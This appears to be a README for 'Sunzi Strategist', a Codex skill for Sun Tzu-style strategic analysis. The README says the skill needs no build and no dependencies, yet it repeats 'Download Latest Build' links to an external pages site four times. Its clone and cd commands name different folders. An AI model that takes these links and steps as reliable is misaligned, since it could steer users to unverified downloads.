# Sunzi Strategist v1.0 - AI Skill 2026

> **An open-source Codex strategy skill inspired by Sun Tzu, built to support better decisions by surfacing the decisive unknowns, selecting the right battlefield, and defining clear stop-loss points in complex situations.**

[![Platform](https://img.shields.io/badge/Platform-Codex-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v1.0-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/kevinwood63/sunzi-strategist-ai?style=flat-square)](https://github.com/kevinwood63/sunzi-strategist-ai)

---

<p align="center">
  <a href="https://kevinwood63.github.io/sunzi-strategist-ai/">
    <img src="https://img.shields.io/badge/Download-Sunzi%20Strategist%20Latest-brightgreen?style=for-the-badge" alt="Download Sunzi Strategist">
  </a>
</p>

> **[Direct Download - Sunzi Strategist v1.0](https://kevinwood63.github.io/sunzi-strategist-ai/)**

---

[Download Latest Build](https://kevinwood63.github.io/sunzi-strategist-ai/)

---

## What Sunzi Strategist Does

Sunzi Strategist is a Codex-native AI skill that translates classical strategy into a practical framework for modern choices. It helps users work through uncertainty by measuring confidence, isolating the missing facts that actually change outcomes, and choosing the most favorable conditions before entering a competitive or cooperative situation.

It is aimed at strategists, project managers, analysts, and anyone who has to decide under pressure with incomplete information. Instead of leaning on instinct alone, Sunzi Strategist offers a repeatable way to evaluate the landscape, forecast opponent reactions two moves ahead, and determine when to stop, retreat, or continue pressing for a recovery. Because the project is fully open-source, the logic can be reviewed, adapted, and extended to fit different strategic workflows.

---

## Core Capabilities

- **Confidence & Judgment Levels** - Rate how certain you are about important assumptions and decisions on a structured scale.
- **Decisive Unknown Identification** - Surface the gaps in information that are most likely to affect the result.
- **Battlefield Selection** - Determine the best time, setting, and conditions for engagement.
- **Two-Step Opponent Reaction Modeling** - Predict likely responses and follow-up reactions before taking action.
- **Stop-Loss Criteria** - Set explicit thresholds for deciding when to exit or abandon a path.
- **Turnaround Condition Analysis** - Spot cases where a weak position may still be recoverable.
- **Open-Source Framework** - The full codebase is available for modification and community contribution.
- **Codex Integration** - Designed to operate smoothly inside the Codex AI environment for live strategic support.

---

## Installation

Clone the repository into your local setup or Codex workspace:

```bash
git clone https://github.com/kevinwood63/sunzi-strategist-ai.git
cd sunzi-strategist-skill
```

There is no build phase. Load the skill directly into your Codex instance with the supplied skill manifest file. On the initial run, it starts with the default strategic parameters.

---

## Using the Skill

Once installed, enable Sunzi Strategist in Codex by calling it from your prompt or skill configuration. A basic flow looks like this:

1. **Describe the situation** - Explain the decision context, stakeholders, and important variables.
2. **Assess confidence** - The skill asks you to score certainty for each factor.
3. **Find decisive unknowns** - Get a ranked list of missing information with the biggest impact.
4. **Select the battlefield** - Receive guidance on the most advantageous conditions for engagement.
5. **Simulate responses** - Build a two-step chain of likely opponent reactions.
6. **Define exit and recovery rules** - Establish your stop-loss and turnaround criteria.

Example command within Codex:

```
/sunzi assess --situation "Market entry for new product" --opponents "competitor A, competitor B"
```

---

## Configuration

Skill settings live in a JSON file at the root of the project (`config.json`). You can tune the default confidence levels, reaction depth, and threshold values. Example:

```json
{
  "confidence_levels": ["low", "medium", "high", "certain"],
  "reaction_depth": 2,
  "default_stop_loss": 0.3,
  "turnaround_threshold": 0.6
}
```

If you want to restore the defaults, remove or rename `config.json` and restart the skill.

---

## Requirements

- **Platform:** Codex (any version that supports custom skills)
- **Runtime:** No external dependencies; runs entirely within Codex
- **Storage:** Minimal - configuration file is under 10 KB
- **Language:** English (skill prompts and output are in English)

---

## FAQ

**How do I update the skill?**  
Pull the latest repository changes and reload the skill in Codex. Your configuration files are kept intact during updates.

**Can I customize the strategic framework?**  
Yes. The project is fully open-source under GPL v3, so you can change the core logic and adjust the configuration values as needed.

**What if I encounter errors during assessment?**  
Make sure the situation description is complete and that every required input has been supplied. Also check `config.json` for invalid values. If the issue continues, open a repository issue.

**Is there a limit on the number of opponents I can model?**  
There is no strict limit, but performance may decline once you go beyond five opponents because two-step reaction modeling becomes combinatorial.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
